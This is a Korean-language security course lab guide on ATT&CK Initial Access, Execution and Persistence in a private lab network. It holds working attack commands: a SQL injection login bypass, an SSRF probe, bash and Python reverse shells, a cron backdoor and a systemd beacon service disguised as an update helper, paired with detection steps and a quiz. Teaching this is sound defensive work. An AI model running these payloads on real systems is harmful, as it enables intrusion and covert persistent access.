# Week 02: 다단계 침투 — Initial Access, Execution, Persistence

## 학습 목표
- MITRE ATT&CK의 Initial Access(TA0001) 전술의 주요 기법을 실습한다
- Execution(TA0002) 단계에서 페이로드 실행 기법을 이해하고 구현한다
- Persistence(TA0003) 기법을 통해 시스템 재부팅 후에도 접근을 유지하는 방법을 익힌다
- 각 단계별 탐지 포인트를 식별하고 방어 전략을 수립할 수 있다

## 선수 지식
- 공방전 기초 과정 이수
- Week 01 킬체인 및 ATT&CK 프레임워크 이해
- Linux 시스템 관리 기본

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 공격 기지 | `ssh opsclaw@10.20.30.201` |
| web | 10.20.30.80 | 공격 대상 (웹 서버) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | Initial Access 이론 | 강의 |
| 0:30-1:10 | Initial Access 실습 (피싱, 웹 익스플로잇) | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:50 | Execution 기법 이론 및 실습 | 실습 |
| 1:50-2:30 | Persistence 기법 실습 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 탐지 및 방어 실습 | 실습 |
| 3:10-3:30 | 토론 + 퀴즈 | 토론 |

---

# Part 1: Initial Access — 초기 침투 (30분)

## 1.1 Initial Access 주요 기법

| 기법 ID | 기법 | 설명 | 난이도 |
|---------|------|------|--------|
| T1566 | Phishing | 악성 첨부/링크 | 중 |
| T1190 | Exploit Public-Facing App | 공개 서비스 취약점 | 상 |
| T1133 | External Remote Services | VPN/RDP 탈취 | 중 |
| T1078 | Valid Accounts | 유출된 자격증명 | 하 |
| T1195 | Supply Chain Compromise | 공급망 공격 | 최상 |

## 1.2 웹 애플리케이션 취약점을 통한 초기 침투

```bash
# JuiceShop 대상 SQL Injection 테스트
curl -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}'

# 서버 사이드 요청 위조(SSRF) 탐색
curl "http://10.20.30.80:3000/api/image?url=http://localhost:8080/admin"
```

---

# Part 2: Execution — 코드 실행 (30분)

## 2.1 Execution 기법 분류

| 기법 ID | 기법 | 플랫폼 |
|---------|------|--------|
| T1059.004 | Unix Shell | Linux |
| T1059.001 | PowerShell | Windows |
| T1053.003 | Cron | Linux |
| T1059.006 | Python | 크로스 플랫폼 |

## 실습 2.1: 리버스 셸 구성

> **목적**: 초기 침투 후 대화형 셸을 확보한다
> **배우는 것**: 리버스 셸 원리, 네트워크 연결 방향

```bash
# 공격자 측 (opsclaw): 리스너 대기
nc -lvnp 4444

# 대상 측 (web): 리버스 셸 실행 (실습용)
bash -c 'bash -i >& /dev/tcp/10.20.30.201/4444 0>&1'

# Python 리버스 셸 (대안)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.20.30.201",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

# Part 3: Persistence — 지속성 확보 (40분)

## 3.1 Linux Persistence 기법

| 기법 | ATT&CK | 설명 | 탐지 난이도 |
|------|--------|------|------------|
| Cron Job | T1053.003 | 주기적 실행 | 낮음 |
| SSH Authorized Keys | T1098.004 | SSH 키 추가 | 중간 |
| Systemd Service | T1543.002 | 서비스 등록 | 중간 |
| .bashrc 수정 | T1546.004 | 로그인 시 실행 | 낮음 |
| LD_PRELOAD | T1574.006 | 라이브러리 하이재킹 | 높음 |

## 실습 3.1: Cron 기반 지속성

> **목적**: 시스템 재부팅 후에도 C2 연결을 유지한다
> **배우는 것**: crontab 백도어 설치 및 탐지

```bash
# 공격자: cron 백도어 설치 (실습용)
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.20.30.201/4444 0>&1'" | crontab -

# 방어자: cron 감사
crontab -l
ls -la /var/spool/cron/crontabs/
cat /etc/crontab
```

## 실습 3.2: Systemd 서비스 지속성

> **목적**: 시스템 서비스로 위장한 백도어를 설치한다
> **배우는 것**: systemd 유닛 파일 구조, 서비스 기반 탐지

```bash
# 악성 서비스 파일 생성 (실습용)
cat > /tmp/update-helper.service << 'EOF'
[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do sleep 300; curl http://10.20.30.201:8080/beacon; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 방어자: 의심스러운 서비스 탐지
systemctl list-units --type=service --state=running | grep -v known
find /etc/systemd/system -name "*.service" -newer /etc/os-release
```

---

# Part 4: 탐지 및 방어 (30분)

## 4.1 OpsClaw를 활용한 침투 단계 탐지

```bash
# OpsClaw 프로젝트 생성: 다단계 침투 탐지
curl -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "detect-multi-stage",
    "request_text": "Initial Access/Execution/Persistence 탐지 규칙 점검",
    "master_mode": "external"
  }'

# Wazuh에서 persistence 탐지 규칙 확인
curl -X POST http://localhost:8000/projects/{id}/dispatch \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{"command":"grep -r \"crontab\\|systemd\" /var/ossec/ruleset/rules/","subagent_url":"http://10.20.30.100:8002"}'
```

---

## 검증 체크리스트
- [ ] T1190(웹 취약점)을 통한 초기 침투를 수행할 수 있다
- [ ] 리버스 셸을 구성하고 대화형 세션을 획득할 수 있다
- [ ] 최소 3가지 Linux persistence 기법을 설치하고 탐지할 수 있다
- [ ] 각 단계의 ATT&CK ID를 정확히 매핑할 수 있다
- [ ] Wazuh 탐지 규칙으로 persistence 활동을 식별할 수 있다

## 자가 점검 퀴즈
1. Initial Access 기법 중 T1195(Supply Chain Compromise)가 탐지하기 어려운 이유를 설명하시오.
2. 리버스 셸과 바인드 셸의 차이점은 무엇이며, 방화벽 관점에서 어떤 것이 더 유리한가?
3. Systemd 기반 persistence를 탐지하기 위한 3가지 방법을 나열하시오.
4. LD_PRELOAD 하이재킹은 어떤 원리로 동작하며, 탐지 방법은?
5. 공격자가 여러 persistence 기법을 동시에 사용하는 이유는 무엇인가?
